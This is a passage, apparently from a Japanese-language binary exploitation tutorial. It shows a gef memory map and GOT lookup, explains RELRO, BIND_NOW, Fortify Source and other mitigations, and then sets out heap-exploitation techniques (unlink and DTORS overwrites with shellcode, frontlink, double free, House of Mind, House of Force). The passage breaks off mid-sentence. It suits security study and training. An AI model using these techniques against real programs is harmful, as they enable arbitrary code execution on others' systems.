0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
バイナリ**relroなし**の場合、`fgets`の`got`エントリアドレスは`0x404018`であることがわかります。メモリマッピングを見ると、これは`0x404000`と`0x405000`の間にあり、**権限が`rw`**であることがわかります。つまり、読み書きが可能です。一方、**relroあり**のバイナリでは、バイナリの実行時の`got`テーブルアドレス（pieが有効になっているため、このアドレスは変わります）は`0x555555557fd0`です。そのバイナリのメモリマッピングでは、`0x0000555555557000`と`0x0000555555558000`の間にあり、メモリ**権限が`r`**であり、読み取りのみが可能です。

では、**バイパス**は何でしょうか？私が通常使用するバイパスは、relroによって読み取り専用になるメモリ領域に書き込まないようにし、**コード実行を取得する別の方法を見つける**ことです。

これが起こるためには、バイナリが実行前に関数のアドレスを知っている必要があります：

* 遅延バインディング：関数のアドレスは、関数が最初に呼び出されるときに検索されます。したがって、実行中にGOTに書き込み権限が必要です。
* 今すぐバインド：関数のアドレスは実行の開始時に解決され、その後、.got、.dtors、.ctors、.dynamic、.jcrなどの重要なセクションに読み取り専用権限が与えられます。`` `**``-z relro`**`y`**`-z now\`\*\*

プログラムが今すぐバインドを使用しているかどうかを確認するには、次のようにします：
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
バイナリがメモリにロードされ、関数が初めて呼び出されると、PLT（Procedure Linkage Table）にジャンプされます。そこからGOTにジャンプし、そのエントリが解決されていないことがわかります（次のPLTアドレスを含んでいます）。そのため、ランタイムリンカまたはrtfdを呼び出してアドレスを解決し、GOTに保存します。

関数が呼び出されると、PLTが呼び出され、そこには関数のアドレスが保存されているGOTがあります。したがって、フローはそこにリダイレクトされ、関数が呼び出されます。ただし、関数が初めて呼び出される場合、GOTにあるのはPLTの次の命令であり、そのため、フローはPLTのコード（rtfd）に従い、関数のアドレスを調べ、それをGOTに保存して呼び出します。

バイナリをメモリにロードすると、コンパイラはプログラムを実行する際にロードする必要があるデータを配置するオフセットを指示します。

遅延バインディング（Lazy binding）—> 関数のアドレスは、その関数が最初に呼び出されるときに検索され、GOTに書き込むために書き込み権限を持っています。

今すぐバインド（Bind now）—> プログラムをロードする際に関数のアドレスが検索され、.got、.dtors、.ctors、.dynamic、.jcrセクションの権限が読み取り専用に変更されます。**-z relro** および **-z now**

しかし、一般的に、プログラムはこれらのオプションで複雑になっていないため、これらの攻撃は依然として可能です。

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** —> BIND NOW を使用しているかどうかを確認するために使用

**Fortify Source -D_FORTIFY_SOURCE=1 または =2**

不安全なコピー関数を特定し、安全な関数に置き換えます。

例：\
char buf\[16];\
strcpy(but, source);

これを不安全として識別し、strcpy() を \_\_strcpy\_chk() に変更し、バッファのサイズを最大コピー量として使用します。

**=1** と **=2** の違いは次のとおりです：

2番目は、**%n** が書き込み可能なセクションから来ないようにします。また、引数の直接アクセスパラメータは、前述のものを使用している場合にのみ使用できます。つまり、**%3$d** を使用できるのは、**%2$d** と **%1$d** を使用した後だけです。

エラーメッセージを表示するためには、argv\[0\] を使用します。したがって、他の場所のアドレス（グローバル変数など）を argv\[0\] に入れると、エラーメッセージにその変数の内容が表示されます。ページ191

**Libsafe の置き換え**

次のように有効になります: LD\_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

いくつかの危険な関数呼び出しを安全な関数に置き換えます。標準化されていません（x86 専用、-fomit-frame-pointer でのコンパイル、静的コンパイルでは機能せず、すべての脆弱な関数が安全になるわけではなく、suid バイナリでは LD\_PRELOAD は機能しません）。

**ASCII Armored Address Space**

共有ライブラリを 0x00000000 から 0x00ffffff にロードして、常に 0x00 が含まれるようにします。ただし、これはほとんどの攻撃を防ぐことができず、リトルエンディアンではなおさらです。

**ret2plt**

これは、strcpy@plt（plt の関数）を呼び出し、GOT のエントリを指し、呼び出したい関数（system()）の最初のバイトをコピーすることで ROP を実行することです。その後、GOT+1 を指して同じことを行い、system() の 2 番目のバイトをコピーします。最後に、GOT に保存されたアドレスを呼び出し、それが system() になります。

**Falso EBP**

EBP を引数を直接指すためのレジスタとして使用する関数に対して、EIP を変更して system() を指すようにするには、EBP も変更して、2 バイトの任意の値を指し、その後に &"/bin/sh" のアドレスを指すメモリ領域を指すようにする必要があります。

**chroot() によるジェイル**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリに基本システムをインストールします

管理者は、mkdir foo; chroot foo; cd .. を使用して、これらのジェイルから抜け出すことができます。

**コードのインストゥルメンテーション**

Valgrind —> エラーを検索します\
Memcheck\
RAD（Return Address Defender）\
Insure++

## **8 ヒープオーバーフロー: 基本的なエクスプロイト**

**割り当てられたチャンク**

prev\_size |\
size | —ヘッダー\
\*mem | データ

**フリーチャンク**

prev\_size |\
size |\
\*fd | 次のチャンクへのポインタ\
\*bk | 前のチャンクへのポインタ —ヘッダー\
\*mem | データ

フリーチャンクは双方向リスト（bin）にあり、2 つのフリーチャンクが連続してはいけません（結合されます）

「size」には、前のチャンクが使用中であるか、mmap() で割り当てられたか、チャンクがプライマリアリーナに属しているかを示すビットが含まれています。

チャンクを解放すると、隣接するチャンクが空いている場合、unlink() マクロを使用してこれらを結合し、新しい最大のチャンクを frontlink() に渡して適切な bin に挿入します。

unlink(){\
BK = P->bk; —> 新しいチャンクの BK は以前に空いていたチャンクの BK になります\
FD = P->fd; —> 新しいチャンクの FD は以前に空いていたチャンクの FD になります\
FD->bk = BK; —> 次のチャンクの BK が新しいチャンクを指すようにします\
BK->fd = FD; —> 前のチャンクの FD が新しいチャンクを指すようにします\
}

したがって、P->bk をシェルコードのアドレスに変更し、P->fd を GDT または DTORS のエントリのアドレスから 12 減算したアドレスに変更すると、次のことが達成されます：

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

そして、プログラムを終了するときに shellcode が実行されます。

さらに、unlink() の 4 番目のステートメントは何かを書き込み、shellcode はこのために修正される必要があります：

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> これにより、shellcode の 8 バイト目から 4 バイトが書き込まれ、shellcode の最初の命令がこれをスキップして残りの shellcode に移動するようになります。

したがって、エクスプロイトは次のように作成されます：

buffer1 に、shellcode が nops に到達するジャンプを含むように配置します。

shellcode の後に、prev\_size と次のチャンクの size に到達するまでパディングを追加します。これらの場所には 0xfffffff0（prev\_size を上書きして空いていると示すビットを持たせるため）と "-4"（0xfffffffc）を追加します（2 番目のチャンクが実際に空いていると判断されるように、3 番目のチャンクで 2 番目のチャンクが空いているかどうかを確認するときに、実際には 2 番目の - 4 に移動します）。つまり、free() が調査するときには、3 番目の size に移動しますが、実際には 2 番目の - 4 に移動し、2 番目のチャンクが空いていると判断されます。その後、unlink() が呼び出されます。

unlink() を呼び出すときに、P->fd として 2 番目のデータを使用するため、ここに上書きしたいアドレスが入ります。そして、そのアドレスには、shellcode へのアドレス（P->bk の偽物）が含まれるようにします。

**unset() による解放（wargame）**

3 つの連続したチャンクを制御し、解放の順序が予約の逆順になります。

この場合：

チャンク c に shellcode を配置します

チャンク a は、b を上書きして size に PREV\_INUSE ビットがオフになるように使用します。これにより、チャンク a が空いていると思われます。

さらに、b のヘッダーに size を -4 に設定します。

その後、プログラムはチャンク a が空いていると思い込み、bin にあると思い込んで unlink() を呼び出します。ただし、b のヘッダーの PREV\_SIZE が -4 になるため、チャンク a が実際には b+4 から始まると思われます。つまり、b+12 にはポインタ "fd" があり、b+16 にはポインタ "bk" があります。

したがって、bk に shellcode のアドレスを、fd に "puts()" - 12 のアドレスを配置すると、ペイロードが作成されます。

**Frontlink テクニック**

解放されるとき、その隣接するチャンクが空いていない場合、unlink() ではなく直接 frontlink() が呼び出されます。

malloc() が解放されることがない場合に有用な脆弱性です。

必要なもの：

* データ入力でオーバーフロー可能なバッファ
* このバッファに隣接する解放されるバッファで、オーバーフローによってヘッダーの fd フィールドを変更できる
* 解放されるバッファのサイズが 512 より大きく、バッファの前にこのサイズを制御できるバッファが宣言されている

これにより、2 つの malloc を制御し、1 つは制御可能なバッファになるように解放され、挿入される bin が欺かれ、次にそのバッファが使用されるときに攻撃者が権限を持っている場合、望ましい位置にバッファが与えられ、書き込むことができます。

**double free() の脆弱性**

同じポインタで 2 回 free() が呼び出されると、同じアドレスを指す 2 つの bin が残ります。

1 つを再利用する場合は問題ありませんが、もう 1 つを再利用する場合は、前の予約で書き込まれるデータによって fd および bk ポインタが誤った値になります。

**After free()**

以前に解放されたポインタが制御なしに再度使用されます。

## **8 ヒープオーバーフロー: 発展的なエクスプロイト**

Unlink() および FrontLink() のテクニックは、unlink() 関数を変更することで削除されました。

**The house of mind**

コードを任意に実行するには、free() を呼び出すだけで十分です。攻撃者が制御可能な malloc のポインタを持つ必要があります。そのポインタがオーバーフロー可能なヒープの下にある場合、そのポインタをどこにでも指すことができます。ただし、どこでも有効な場所ではなく、偽のサイズが av->max\_fast より小さく、特に次の malloc() の要求されたサイズと等しい場合です。したがって、次に malloc(40) が呼び出されることがわかっている場合、偽のチャンクのサイズは 48 にする必要があります。

たとえば、ユーザーに数値を尋ねるプログラムがある場合、48 を入力し、その後の 4 バイト（おそらく EBP）を指すポインタを入力すると、次の malloc がそのポインタを指すアドレスになり、攻撃者がそのアドレスに書き込むことができます。

**The House of Force**

必要なもの：

* wilderness をオーバーフローさせるヒープへのアクセス
* ユーザーが定義したサイズで malloc() が呼び
